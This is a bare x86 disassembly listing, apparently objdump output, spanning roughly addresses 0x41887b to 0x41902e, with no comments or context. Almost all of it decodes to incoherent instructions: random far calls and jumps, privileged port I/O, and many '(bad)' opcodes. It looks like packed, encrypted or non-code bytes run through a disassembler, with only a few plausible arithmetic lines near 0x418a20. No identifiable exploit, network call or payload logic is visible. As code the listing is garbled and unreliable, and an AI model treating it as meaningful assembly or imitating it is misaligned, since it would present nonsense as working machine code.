  41887b:	aas    
  41887c:	fidiv  DWORD PTR [edi-0x24]
  41887f:	jbe    0x41888a
  418881:	hlt    
  418882:	popa   
  418883:	and    eax,0xe98d7dcb
  418888:	jp     0x418890
  41888a:	imul   DWORD PTR [edi+0x629f4c49]
  418890:	sub    ebx,ebp
  418892:	retf   
  418893:	mov    cs,ebp
  418895:	out    dx,eax
  418896:	cmc    
  418897:	outs   dx,DWORD PTR ds:[esi]
  418898:	push   esp
  418899:	lds    ebp,FWORD PTR [ebx+0x2e]
  41889c:	clc    
  41889d:	test   eax,0x764356be
  4188a2:	and    ebp,0xfdcd4456
  4188a8:	fs mov dh,0x46
  4188ab:	and    eax,0x9fdb7ce0
  4188b0:	mov    al,0x9d
  4188b2:	xchg   esi,eax
  4188b3:	outs   dx,DWORD PTR ds:[esi]
  4188b4:	in     eax,0xd
  4188b6:	xchg   esp,eax
  4188b7:	js     0x418906
  4188b9:	cmp    ebx,DWORD PTR [ecx+0x9]
  4188bc:	jae    0x418852
  4188be:	das    
  4188bf:	and    edi,DWORD PTR [eax-0x49ea952f]
  4188c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188c6:	mov    DWORD PTR [edx+0x12],0xc6aec063
  4188cd:	push   es
  4188ce:	mov    ch,0xab
  4188d0:	(bad)  
  4188d2:	mov    esp,0xfa14b933
  4188d7:	mov    edx,0x792bf91a
  4188dc:	mov    ds:0xde33fd92,al
  4188e1:	addr16 jo 0x4188a0
  4188e4:	jge    0x4188f4
  4188e6:	mov    ecx,0x11413429
  4188eb:	adc    eax,DWORD PTR [esi-0x5f9e009a]
  4188f1:	inc    eax
  4188f2:	shl    BYTE PTR [esp+ecx*8+0x65],0x41
  4188f7:	loopne 0x4188d2
  4188f9:	jbe    0x418918
  4188fb:	xor    al,0x6f
  4188fd:	test   al,0x46
  4188ff:	std    
  418900:	push   ebp
  418901:	xor    DWORD PTR [esi+0x21499853],esp
  418907:	pop    ecx
  418908:	shl    BYTE PTR [ecx+0x10ac1bf0],cl
  41890e:	cmp    BYTE PTR [esi+eiz*2+0x3a],dh
  418912:	or     BYTE PTR [ebx],bl
  418914:	in     eax,0xd0
  418916:	inc    esi
  418917:	arpl   WORD PTR [ecx+0x37],bx
  41891a:	imul   esp,edx,0x29
  41891d:	add    eax,0x3557605
  418922:	inc    ebx
  418923:	cmp    eax,0x4dd7d2a
  418928:	xlat   BYTE PTR ds:[ebx]
  418929:	neg    edi
  41892b:	and    BYTE PTR [eax],al
  41892d:	pop    ecx
  41892e:	icebp  
  41892f:	mov    eax,0x7ddf7c6c
  418934:	inc    ecx
  418935:	or     al,0x8a
  418937:	jb     0x41899f
  418939:	mov    ds:0xccdccc05,eax
  41893e:	jnp    0x41892c
  418940:	sub    DWORD PTR [ecx-0x5e],ebx
  418943:	mov    ss,WORD PTR [esi+eiz*8+0x62]
  418947:	xchg   esp,eax
  418948:	pushf  
  418949:	(bad)  
  41894a:	cmc    
  41894b:	lods   al,BYTE PTR ds:[esi]
  41894c:	inc    esp
  41894d:	jg     0x4189bd
  41894f:	add    bh,BYTE PTR [esi+0x5]
  418952:	(bad)  
  418953:	mov    al,0xb1
  418955:	inc    ebp
  418956:	push   esi
  418957:	jge    0x4189ba
  418959:	add    eax,0x7d34c255
  41895e:	aaa    
  41895f:	xor    al,0x1
  418961:	fild   QWORD PTR [esi+0x330a96f5]
  418967:	inc    esi
  418968:	imul   esp,DWORD PTR [edi],0xffffff84
  41896b:	cmp    ah,BYTE PTR [edi-0x50514218]
  418971:	into   
  418972:	imul   eax,eax,0x39
  418975:	add    BYTE PTR [edi+esi*8],bl
  418978:	and    ebx,ecx
  41897a:	mov    ah,0xbb
  41897c:	inc    ebx
  41897d:	pop    esi
  41897e:	hlt    
  41897f:	or     ebx,DWORD PTR [edi+0x43]
  418982:	clc    
  418983:	stos   BYTE PTR es:[edi],al
  418984:	repz dec esp
  418986:	xchg   ecx,eax
  418987:	pop    edx
  418988:	(bad)  
  418989:	xchg   ebx,eax
  41898a:	lds    edx,FWORD PTR [edx+0x40d76357]
  418990:	xor    eax,0xb2bb150a
  418995:	dec    ebp
  418996:	adc    BYTE PTR [esi-0x6f],0x82
  41899a:	mov    edx,0x4fbd8c77
  41899f:	push   0x3972dd87
  4189a4:	les    eax,FWORD PTR ds:0xfccb08be
  4189aa:	shl    DWORD PTR [edi+0x75],cl
  4189ad:	lds    edx,FWORD PTR [edi+0x40]
  4189b0:	and    eax,0x16fb7b6d
  4189b5:	inc    ecx
  4189b6:	sbb    al,BYTE PTR [ebx+0x35]
  4189b9:	enter  0xe843,0xa7
  4189bd:	mov    ah,0x23
  4189bf:	shr    esi,0xbc
  4189c2:	jl     0x418996
  4189c4:	not    BYTE PTR [ebp+0x38a4acf3]
  4189ca:	fcom   QWORD PTR [esi+0x50]
  4189cd:	rcr    BYTE PTR [ebx+0x36],0xc8
  4189d1:	arpl   WORD PTR ds:0x36d1e7b6,ax
  4189d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d8:	call   0xf2cd:0x95097192
  4189df:	cwde   
  4189e0:	daa    
  4189e1:	and    dh,BYTE PTR [esi+0x63]
  4189e4:	mul    al
  4189e6:	add    ch,BYTE PTR gs:[ecx-0x2b53daea]
  4189ed:	adc    eax,0xeac5433f
  4189f2:	mov    esi,0xfd632c30
  4189f7:	data16 daa 
  4189f9:	bound  esi,QWORD PTR [edx-0x38]
  4189fc:	jns    0x418a7d
  4189fe:	sti    
  4189ff:	inc    ebx
  418a00:	jns    0x418a1e
  418a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a03:	das    
  418a04:	sub    eax,0xb459c8c8
  418a09:	ficomp WORD PTR [edi+0x5725e546]
  418a0f:	mov    ebp,?
  418a11:	(bad)  
  418a12:	mov    eax,ds:0xe7317884
  418a17:	lods   al,BYTE PTR ds:[esi]
  418a18:	jno    0x4189b9
  418a1a:	and    eax,0x9281a1ff
  418a1f:	xlat   BYTE PTR ds:[ebx]
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	xchg   edi,eax
  418a3f:	repnz adc al,0x4e
  418a42:	cmp    DWORD PTR [edi],ebx
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	out    0x7b,eax
  418a4c:	(bad)
  418a4f:	xchg   esi,eax
  418a50:	popf   
  418a51:	inc    esp
  418a52:	xor    BYTE PTR [edi-0x15],ch
  418a55:	icebp  
  418a56:	mov    bl,0xc2
  418a58:	mov    esp,0x8d5173c5
  418a5d:	pop    es
  418a5e:	nop
  418a5f:	jmp    0xc7db94fb
  418a64:	popa   
  418a65:	pop    ebp
  418a66:	sahf   
  418a67:	retf   0x79fc
  418a6a:	dec    edx
  418a6b:	pusha  
  418a6c:	jle    0x418a04
  418a6e:	mov    dh,0x5d
  418a70:	fwait
  418a71:	jbe    0x418aaa
  418a73:	mov    WORD PTR ds:0x5ca934e9,?
  418a79:	push   0x4d6a90f5
  418a7e:	ins    BYTE PTR es:[edi],dx
  418a7f:	xchg   BYTE PTR [edx],dl
  418a81:	aad    0xc3
  418a83:	or     ebx,0x41a7ecb8
  418a89:	cmp    al,0x22
  418a8b:	aad    0xa
  418a8d:	jg     0x418a33
  418a8f:	imul   ebp,DWORD PTR [edx+ebp*1],0x30
  418a93:	push   esp
  418a94:	xchg   edx,eax
  418a95:	stos   BYTE PTR es:[edi],al
  418a96:	leave  
  418a97:	fisub  WORD PTR [ebp-0x63]
  418a9a:	jl     0x418add
  418a9c:	ds (bad) 
  418aa0:	ins    DWORD PTR es:[edi],dx
  418aa1:	sbb    eax,0x16e3b2a4
  418aa6:	ret    0xdc11
  418aa9:	lods   eax,DWORD PTR ds:[esi]
  418aaa:	sub    DWORD PTR [eax+ebx*4],eax
  418aad:	push   edx
  418aae:	int3   
  418aaf:	adc    ebx,esp
  418ab1:	inc    eax
  418ab2:	push   edx
  418ab3:	inc    ebp
  418ab4:	(bad)  
  418ab5:	aam    0x6f
  418ab7:	in     eax,0x5
  418ab9:	lahf   
  418aba:	out    0x90,al
  418abc:	or     DWORD PTR [edx],ecx
  418abe:	fsub   QWORD PTR [ebp-0x25]
  418ac1:	jno    0x418af5
  418ac3:	(bad)  
  418ac4:	call   0x9c83daf4
  418ac9:	xchg   esi,eax
  418aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418acc:	xchg   esp,eax
  418acd:	add    al,0x92
  418acf:	in     eax,0x12
  418ad1:	inc    ecx
  418ad2:	jo     0x418b2f
  418ad4:	cmp    ebx,DWORD PTR [eax-0x22]
  418ad7:	xor    cl,BYTE PTR [si-0x62]
  418adb:	aaa    
  418adc:	push   cs
  418add:	(bad)  
  418adf:	jo     0x418ae7
  418ae1:	fldcw  WORD PTR [ebx+0x45f0f389]
  418ae7:	add    ebp,DWORD PTR [edi-0x45dd8abf]
  418aed:	xor    edx,DWORD PTR [eax-0x17e5551f]
  418af3:	ja     0x418b03
  418af5:	sbb    ebx,DWORD PTR [edi]
  418af7:	outs   dx,DWORD PTR ds:[esi]
  418af8:	and    al,0x99
  418afa:	scas   al,BYTE PTR es:[edi]
  418afb:	or     al,0x4f
  418afd:	mov    esp,DWORD PTR [esi+0x6fa9fac9]
  418b03:	scas   al,BYTE PTR es:[edi]
  418b04:	dec    ebx
  418b05:	jb     0x418b18
  418b07:	int3   
  418b08:	push   cs
  418b09:	mov    ds:0x2dd5258a,eax
  418b0e:	dec    eax
  418b0f:	fisubr DWORD PTR [edx]
  418b11:	test   al,0xc1
  418b13:	xchg   BYTE PTR [edi],cl
  418b15:	push   ebp
  418b16:	adc    ebx,esi
  418b18:	jns    0x418b76
  418b1a:	jns    0x418ab6
  418b1c:	inc    edx
  418b1d:	mov    ds:0x369dbd53,al
  418b22:	test   eax,0x7dcf9168
  418b27:	lock dec edx
  418b29:	adc    ch,BYTE PTR [ebx]
  418b2b:	adc    BYTE PTR [ebx-0xa],ch
  418b2e:	stos   BYTE PTR es:[edi],al
  418b2f:	mov    dh,0x3
  418b31:	or     BYTE PTR [edi],ch
  418b33:	stos   DWORD PTR es:[edi],eax
  418b34:	cld    
  418b35:	mov    ah,0x69
  418b37:	leave  
  418b38:	pushf  
  418b39:	xor    edx,DWORD PTR [eax+0x6bfe3b68]
  418b3f:	cmp    DWORD PTR [ecx+0x89db783],ebx
  418b45:	cmp    edi,DWORD PTR ds:0x111c9220
  418b4b:	jnp    0x418bbf
  418b4d:	das    
  418b4e:	pop    ecx
  418b4f:	xchg   BYTE PTR ds:0x1eb978ce,ah
  418b55:	stc    
  418b56:	jbe    0x418b91
  418b58:	or     dl,ch
  418b5a:	pop    eax
  418b5b:	jb     0x418b9b
  418b5d:	xlat   BYTE PTR ds:[ebx]
  418b5e:	idiv   DWORD PTR [esi]
  418b60:	sbb    eax,0x90cfadc9
  418b65:	inc    ebx
  418b66:	cwde   
  418b67:	dec    esi
  418b68:	scas   al,BYTE PTR es:[edi]
  418b69:	or     bh,BYTE PTR [eax+esi*8]
  418b6c:	cdq    
  418b6d:	popf   
  418b6e:	out    dx,al
  418b6f:	mov    ds:0xfef4458,eax
  418b74:	rol    BYTE PTR [esi],1
  418b76:	test   DWORD PTR [edx+0x7faf30bb],ecx
  418b7c:	call   0x5346:0x67c9fad5
  418b83:	sub    DWORD PTR gs:[ecx-0x4170fe94],eax
  418b8a:	jge    0x418bc4
  418b8c:	mov    ch,BYTE PTR [edx]
  418b8e:	std    
  418b8f:	add    eax,0x6c33eb11
  418b94:	or     ah,BYTE PTR [ebp-0x55]
  418b97:	retf   0xbce1
  418b9a:	in     eax,0x3f
  418b9c:	push   esp
  418b9d:	mov    WORD PTR [eax+0x4024439d],gs
  418ba3:	add    BYTE PTR [ebp-0x35],0x94
  418ba7:	xchg   esp,eax
  418ba8:	sub    al,0x1
  418baa:	les    ebp,FWORD PTR [eax]
  418bac:	test   eax,0x68184dc0
  418bb1:	aad    0xae
  418bb3:	out    dx,al
  418bb4:	mov    WORD PTR [eax-0x66d0e64f],fs
  418bba:	xor    al,0xbb
  418bbc:	pusha  
  418bbd:	je     0x418bab
  418bbf:	cdq    
  418bc0:	out    dx,eax
  418bc1:	je     0x418b4b
  418bc3:	int3   
  418bc4:	xlat   BYTE PTR ds:[ebx]
  418bc5:	cmp    DWORD PTR [ebx-0x2a898b1f],edx
  418bcb:	neg    dh
  418bcd:	sub    ecx,0x62521ad9
  418bd3:	mov    edx,0x22a32a42
  418bd8:	jns    0x418b5d
  418bda:	or     al,0x88
  418bdc:	xchg   ebx,eax
  418bdd:	fistp  DWORD PTR [edi+0x34fdec8b]
  418be3:	mov    al,0x66
  418be5:	mov    edi,0x737b0a4b
  418bea:	or     eax,0xaf5fa12c
  418bef:	jbe    0x418bfa
  418bf1:	cmp    bl,BYTE PTR [edx-0xee60079]
  418bf7:	cli    
  418bf8:	call   0x6cf6eff0
  418bfd:	icebp  
  418bfe:	rol    WORD PTR [ebx],cl
  418c01:	dec    eax
  418c02:	ins    BYTE PTR es:[edi],dx
  418c03:	jg     0x418b91
  418c05:	xchg   edx,eax
  418c06:	test   DWORD PTR [ebx+0x47525c8a],edx
  418c0c:	into   
  418c0d:	add    dh,BYTE PTR [edx-0x64e2b979]
  418c13:	or     bh,BYTE PTR [eax-0x53]
  418c16:	nop
  418c17:	lods   eax,DWORD PTR ds:[esi]
  418c18:	clc    
  418c19:	mov    eax,ds:0x2347db31
  418c1e:	dec    ecx
  418c1f:	dec    ebp
  418c20:	imul   ebp,DWORD PTR [esi],0x348b26f3
  418c26:	xchg   esi,eax
  418c27:	div    ebp
  418c29:	loopne 0x418c6d
  418c2b:	sar    DWORD PTR [edi],0x9c
  418c2e:	jae    0x418bc0
  418c30:	mov    ebp,0x5a6be546
  418c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c36:	push   ss
  418c37:	ins    DWORD PTR es:[edi],dx
  418c38:	inc    esi
  418c39:	clc    
  418c3a:	jl     0x418be4
  418c3c:	in     eax,0x36
  418c3e:	push   ss
  418c3f:	mov    ebx,0xc3e434f8
  418c44:	adc    dh,dh
  418c46:	push   0x3c
  418c48:	jns    0x418c5e
  418c4a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  418c4c:	hlt    
  418c4d:	retf   0xcafe
  418c50:	test   DWORD PTR [edi],esp
  418c52:	ins    DWORD PTR es:[edi],dx
  418c53:	daa    
  418c54:	inc    ebp
  418c55:	add    dl,BYTE PTR gs:[eax+0x58]
  418c59:	adc    BYTE PTR [edx+0x3c],ah
  418c5c:	push   0x7e
  418c5e:	cmp    eax,0x60a751b6
  418c63:	repz jl 0x418cd9
  418c66:	mov    ch,0x9d
  418c68:	mov    ds:0x1543a4ea,eax
  418c6d:	out    dx,al
  418c6e:	adc    eax,0x6d33b57
  418c73:	dec    ecx
  418c74:	cmc    
  418c75:	dec    ebp
  418c76:	xor    al,0x7f
  418c78:	mov    ds:0xb64ed371,eax
  418c7d:	lds    edi,FWORD PTR [ebx]
  418c7f:	sub    cl,ch
  418c81:	dec    ebx
  418c82:	inc    ecx
  418c83:	stc    
  418c84:	xor    eax,0x5e5cc07c
  418c89:	lds    esp,FWORD PTR [eax-0x6]
  418c8c:	xor    DWORD PTR [edi+0x16e64f98],eax
  418c92:	pushf  
  418c93:	jae    0x418c76
  418c95:	xor    esp,esp
  418c97:	jg     0x418cae
  418c99:	mov    dl,0x45
  418c9b:	xor    ecx,DWORD PTR [eax-0x5711619c]
  418ca1:	adc    al,0x70
  418ca3:	mov    al,0xb6
  418ca5:	fcmovnbe st,st(0)
  418ca7:	jge    0x418cff
  418ca9:	mov    ah,0xad
  418cab:	xchg   ebp,eax
  418cac:	test   edi,0xb804a2c2
  418cb2:	daa    
  418cb3:	sti    
  418cb4:	mov    ch,0xb1
  418cb6:	pushf  
  418cb7:	dec    esi
  418cb8:	loopne 0x418c96
  418cba:	(bad)  
  418cbb:	(bad)  
  418cbd:	inc    esp
  418cbe:	mov    edx,eax
  418cc0:	jmp    0x3269:0x636832cd
  418cc7:	stos   BYTE PTR es:[edi],al
  418cc8:	stos   DWORD PTR es:[edi],eax
  418cc9:	add    bh,ch
  418ccb:	pop    edx
  418ccc:	lds    ecx,FWORD PTR [ecx-0x74637641]
  418cd2:	lock rcr DWORD PTR [edi],1
  418cd5:	mov    esi,0x609ba00a
  418cda:	cdq    
  418cdb:	xchg   edi,eax
  418cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cdd:	scas   al,BYTE PTR es:[edi]
  418cde:	add    BYTE PTR ds:0x64a42948,dh
  418ce4:	subps  xmm3,XMMWORD PTR ss:[ebp+0x1687fde5]
  418cec:	dec    ecx
  418ced:	mov    ebx,0x1d2423d5
  418cf2:	sar    BYTE PTR [ecx],0x5f
  418cf5:	push   ebx
  418cf6:	retf   
  418cf7:	mov    ecx,0x30248fea
  418cfc:	jge    0x418d5b
  418cfe:	adc    al,0xda
  418d00:	dec    esp
  418d01:	nop
  418d02:	mov    BYTE PTR [ebx-0x2cd4eb5e],al
  418d08:	and    DWORD PTR [ebp+0x27b3bb89],eax
  418d0e:	(bad)  
  418d0f:	fadd   st,st(3)
  418d11:	addr16 jo 0x418d41
  418d14:	xchg   edi,eax
  418d15:	inc    esi
  418d16:	loop   0x418d15
  418d18:	out    0x73,eax
  418d1a:	add    DWORD PTR [ecx+eiz*8+0x4388ad4e],ebp
  418d21:	iret   
  418d22:	and    eax,0xbfe4520
  418d27:	push   esi
  418d28:	lahf   
  418d29:	pop    edx
  418d2a:	xchg   esi,eax
  418d2b:	dec    eax
  418d2c:	inc    ebp
  418d2d:	aam    0x58
  418d2f:	xchg   ebx,eax
  418d30:	stos   DWORD PTR es:[edi],eax
  418d31:	arpl   WORD PTR [edi-0x4da3d857],ax
  418d37:	inc    eax
  418d38:	jecxz  0x418d6a
  418d3a:	aad    0x8e
  418d3c:	jmp    0x418d01
  418d3e:	inc    esi
  418d3f:	pushf  
  418d40:	stc    
  418d41:	push   ecx
  418d42:	clc    
  418d43:	shl    BYTE PTR [bp+si],cl
  418d46:	call   0xee6d:0x770f33d7
  418d4d:	shr    DWORD PTR [ecx-0x5104d373],0x50
  418d54:	aas    
  418d55:	mov    bl,0x25
  418d57:	in     eax,0xa3
  418d59:	popa   
  418d5a:	pop    ebp
  418d5b:	cli    
  418d5c:	and    al,0xd8
  418d5e:	push   ss
  418d5f:	jmp    0x77317d26
  418d64:	xchg   edx,eax
  418d65:	sbb    al,0xe6
  418d67:	pop    ds
  418d68:	scas   al,BYTE PTR es:[edi]
  418d69:	in     al,0xbb
  418d6b:	xchg   esp,eax
  418d6c:	push   edi
  418d6d:	mov    edx,0xf033a41c
  418d72:	cld    
  418d73:	adc    eax,0x70408f99
  418d78:	adc    ebp,DWORD PTR [ecx]
  418d7a:	idiv   BYTE PTR [ebx]
  418d7c:	xor    eax,0xbde5e4d0
  418d81:	out    0xdf,eax
  418d83:	adc    DWORD PTR [eax+0x7fd6c2cb],ebp
  418d89:	ja     0x418d2b
  418d8b:	mov    al,ds:0x6710a570
  418d90:	jno    0x418d85
  418d92:	jl     0x418dec
  418d94:	rcr    dl,0x2
  418d97:	loope  0x418d36
  418d99:	jno    0x418e12
  418d9b:	pop    esp
  418d9c:	cmp    BYTE PTR [edi],al
  418d9e:	arpl   WORD PTR [edi-0x41],cx
  418da1:	add    BYTE PTR [edx+0x5da56f62],al
  418da7:	data16 in al,0x55
  418daa:	outs   dx,DWORD PTR ds:[esi]
  418dab:	xor    BYTE PTR [edx+0xe],0x6a
  418daf:	push   es
  418db0:	ja     0x418d82
  418db2:	sub    eax,0x6236ab15
  418db7:	ds inc ecx
  418db9:	mov    esp,DWORD PTR [esi+0x59]
  418dbc:	inc    edi
  418dbd:	or     al,0x6a
  418dbf:	hlt    
  418dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc1:	pusha  
  418dc2:	sub    DWORD PTR [ebx-0x12d0b770],esp
  418dc8:	cld    
  418dc9:	rcl    BYTE PTR [ecx-0x50e0c147],cl
  418dcf:	push   ebx
  418dd0:	xor    eax,0x3c6a2a47
  418dd5:	int    0xf8
  418dd7:	loope  0x418e2e
  418dd9:	cmp    al,0x99
  418ddb:	in     eax,0x16
  418ddd:	xor    WORD PTR [ebx+0x26e2badb],si
  418de4:	in     al,0xa7
  418de6:	daa    
  418de7:	jle    0x418da4
  418de9:	mov    dl,ch
  418deb:	dec    ecx
  418dec:	out    dx,al
  418ded:	test   al,0x2e
  418def:	or     eax,0x959910e6
  418df4:	enter  0xdb9,0x35
  418df8:	call   0x7013:0xeaf6cf26
  418dff:	in     al,0x8d
  418e01:	dec    ebp
  418e02:	adc    bl,BYTE PTR [ecx+eax*4-0x3677ec42]
  418e09:	mov    ds:0x8304447b,eax
  418e0e:	inc    esp
  418e0f:	and    DWORD PTR [eax],ebp
  418e11:	inc    esi
  418e12:	call   0x4336:0xae537112
  418e19:	aam    0x85
  418e1b:	cmp    al,0xba
  418e1d:	inc    esp
  418e1e:	stos   BYTE PTR es:[edi],al
  418e1f:	pop    ebp
  418e20:	push   0x121c4f7b
  418e25:	and    esi,ebx
  418e27:	adc    edi,DWORD PTR [ebx+0x56216a7f]
  418e2d:	fwait
  418e2e:	ins    DWORD PTR es:[edi],dx
  418e2f:	inc    esp
  418e30:	mov    dl,0xbc
  418e32:	or     eax,0x604f5bb5
  418e37:	or     al,0x5b
  418e39:	scas   al,BYTE PTR es:[edi]
  418e3a:	xchg   ebx,eax
  418e3b:	xchg   edx,eax
  418e3c:	xchg   edi,eax
  418e3d:	ret    0xe2cc
  418e40:	fild   DWORD PTR [ebx+0x4c]
  418e43:	jecxz  0x418eaa
  418e45:	mov    ch,0xd6
  418e47:	imul   esp,DWORD PTR [ecx+0x10],0x1e
  418e4b:	test   dl,al
  418e4d:	push   ecx
  418e4e:	test   bl,dh
  418e50:	loope  0x418e6d
  418e52:	scas   al,BYTE PTR es:[edi]
  418e53:	or     bl,BYTE PTR [edi]
  418e55:	out    0xc3,al
  418e57:	retf   0x7a00
  418e5a:	jbe    0x418e93
  418e5c:	add    BYTE PTR [ecx],ch
  418e5e:	inc    edi
  418e5f:	out    0xdf,al
  418e61:	xor    ebp,DWORD PTR [ecx+eax*1+0x34]
  418e65:	and    bh,BYTE PTR [ebx-0x424b71d1]
  418e6b:	fs push ss
  418e6d:	mov    al,0xe9
  418e6f:	cmp    al,0x8d
  418e71:	fcmovne st,st(3)
  418e73:	addr16 into 
  418e75:	js     0x418ee1
  418e77:	jecxz  0x418e1c
  418e79:	xchg   edx,eax
  418e7a:	jmp    0xe300:0x91a523a9
  418e81:	add    ah,ah
  418e83:	fisttp WORD PTR [ebx-0x13e12028]
  418e89:	fcomp  st(4)
  418e8b:	dec    esi
  418e8c:	int3   
  418e8d:	sbb    DWORD PTR [ecx],esi
  418e8f:	cli    
  418e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e91:	in     eax,dx
  418e92:	retf   
  418e93:	push   ds
  418e94:	push   esi
  418e95:	fcom   DWORD PTR [eax-0x3b7c99d3]
  418e9b:	out    0x48,eax
  418e9d:	xor    DWORD PTR [ebx+0x5a54ea39],0xffffffe6
  418ea4:	mov    ebx,0x83a4f7f5
  418ea9:	jno    0x418e55
  418eab:	pop    ds
  418eac:	jge    0x418eb2
  418eae:	inc    edi
  418eaf:	jb     0x418ec0
  418eb1:	push   ds
  418eb2:	mov    ecx,0xd83cde42
  418eb7:	push   eax
  418eb8:	mov    ah,0xc7
  418eba:	das    
  418ebb:	fisub  DWORD PTR [esi]
  418ebd:	sbb    cl,0x2b
  418ec0:	(bad)  [edi+0x6af4276f]
  418ec6:	jne    0x418e84
  418ec8:	cld    
  418ec9:	adc    eax,0x23c5ad9d
  418ece:	fstp   QWORD PTR [edx]
  418ed0:	xchg   ebp,eax
  418ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ed2:	push   ds
  418ed3:	mov    ds:0x7729de73,eax
  418ed8:	adc    eax,0x8ec1b932
  418edd:	fwait
  418ede:	rol    dh,cl
  418ee0:	adc    cl,dh
  418ee2:	mov    edx,0xeb7e9019
  418ee7:	sub    eax,edx
  418ee9:	jg     0x418ece
  418eeb:	inc    ebp
  418eec:	or     al,0x4e
  418eee:	push   ss
  418eef:	neg    BYTE PTR [edx-0x56]
  418ef2:	sub    DWORD PTR [eax-0x32],edx
  418ef5:	(bad)  
  418ef7:	mov    ebx,0xf5208730
  418efc:	popa   
  418efd:	and    ah,0xc5
  418f00:	mov    edx,0xbc1efb8d
  418f05:	fldenv [eax-0x5d3f8ae0]
  418f0b:	out    dx,al
  418f0c:	sub    BYTE PTR [ecx-0x6],dl
  418f0f:	inc    edx
  418f10:	scas   eax,DWORD PTR es:[edi]
  418f11:	hlt    
  418f12:	push   edx
  418f13:	and    bl,dl
  418f15:	adc    bl,BYTE PTR [esi-0x3c]
  418f18:	cdq    
  418f19:	bnd ss jae 0x418ece
  418f1d:	outs   dx,BYTE PTR ds:[esi]
  418f1e:	fsubr  QWORD PTR [edx]
  418f20:	sub    esi,DWORD PTR [edi-0x6d2a474b]
  418f26:	mov    bh,ah
  418f28:	or     BYTE PTR [esi-0x17],cl
  418f2b:	mov    ds:0xd17a242b,eax
  418f30:	mov    esp,0xdd81c269
  418f35:	push   edx
  418f36:	sub    al,0xa8
  418f38:	jo     0x418ebc
  418f3a:	pop    esp
  418f3b:	fild   WORD PTR [edx-0x1ff0ecb6]
  418f41:	leave  
  418f42:	mov    BYTE PTR [esp+ebx*1+0x4d],dl
  418f46:	fmul   QWORD PTR [ebx+0x333886ab]
  418f4c:	mov    edx,gs
  418f4e:	cmc    
  418f4f:	fs dec eax
  418f51:	dec    ecx
  418f52:	(bad)  
  418f53:	arpl   bp,bp
  418f55:	(bad)  
  418f56:	adc    edi,DWORD PTR [ecx+0x52]
  418f59:	xchg   edx,eax
  418f5a:	out    0x15,al
  418f5c:	xchg   esp,eax
  418f5d:	ffreep st(5)
  418f5f:	int3   
  418f60:	sahf   
  418f61:	push   es
  418f62:	jns    0x418f42
  418f64:	leave  
  418f65:	pop    ss
  418f66:	mov    bh,0xf1
  418f68:	lock bound edx,QWORD PTR [eax]
  418f6b:	inc    esp
  418f6c:	adc    ebp,ebx
  418f6e:	sub    eax,0x21916a15
  418f73:	or     bl,bl
  418f75:	sti    
  418f76:	fwait
  418f77:	repz aaa 
  418f79:	inc    edi
  418f7a:	out    0x42,al
  418f7c:	jl     0x418f4d
  418f7e:	aam    0xa6
  418f80:	in     eax,0xac
  418f82:	sub    al,0x84
  418f84:	add    al,0x89
  418f86:	mov    cl,0x7e
  418f88:	imul   ebp,DWORD PTR [ecx+eiz*4],0x2e
  418f8c:	mov    eax,0xe0262342
  418f91:	repnz mov ecx,0x82f1d08e
  418f97:	in     eax,0x9f
  418f99:	inc    esi
  418f9a:	push   ebx
  418f9b:	cs dec eax
  418f9d:	stc    
  418f9e:	push   eax
  418f9f:	pop    esi
  418fa0:	add    edi,ebp
  418fa2:	push   ds
  418fa3:	iret   
  418fa4:	aad    0xb7
  418fa6:	inc    eax
  418fa7:	cmp    BYTE PTR [ecx],ch
  418fa9:	ret    
  418faa:	or     BYTE PTR [esi-0x72],cl
  418fad:	scas   al,BYTE PTR es:[edi]
  418fae:	push   esi
  418faf:	xchg   ecx,eax
  418fb0:	dec    ecx
  418fb1:	push   esp
  418fb2:	call   0xfe3f:0xf48956df
  418fb9:	fs xchg ecx,eax
  418fbb:	bound  ebp,QWORD PTR [ebx-0x1d523023]
  418fc1:	iret   
  418fc2:	inc    ebx
  418fc3:	call   0x25b348b4
  418fc8:	or     eax,DWORD PTR [ebx]
  418fca:	pop    ecx
  418fcb:	aad    0xe7
  418fcd:	scas   eax,DWORD PTR es:[edi]
  418fce:	mov    ch,0x40
  418fd0:	fstp   st(6)
  418fd2:	shl    DWORD PTR [ecx],cl
  418fd4:	int    0x6d
  418fd6:	mov    esi,0xda979304
  418fdb:	and    DWORD PTR [ebp+0x7c28d34b],edx
  418fe1:	(bad)  
  418fe2:	xor    ah,BYTE PTR [eax-0x11e4da12]
  418fe8:	jo     0x418fe1
  418fea:	and    ah,BYTE PTR [esi-0x17c45425]
  418ff0:	(bad)  
  418ff1:	adc    DWORD PTR [esi+0x7bfbf606],ebx
  418ff7:	xor    esi,ecx
  418ff9:	(bad)  
  418ffa:	shr    BYTE PTR [ebx-0x58],1
  418ffd:	fwait
  418ffe:	retf   
  418fff:	(bad)  
  419000:	fidivr DWORD PTR [edi+0x287341f4]
  419006:	mov    bh,dl
  419008:	not    BYTE PTR [ecx-0x78e86378]
  41900e:	jp     0x418fb2
  419010:	out    dx,eax
  419011:	cmp    BYTE PTR [edx],ch
  419013:	adc    ebp,DWORD PTR [eax+0x4e]
  419016:	xchg   ch,ah
  419018:	call   FWORD PTR cs:[ebx+0x38]
  41901c:	jbe    0x41901c
  41901e:	xor    eax,0x27cf2446
  419023:	cwde   
  419024:	inc    edi
  419025:	repnz adc dl,BYTE PTR [esi-0x15]
  419029:	ss cmp ah,0x77
  41902d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41902e:	(bad)  
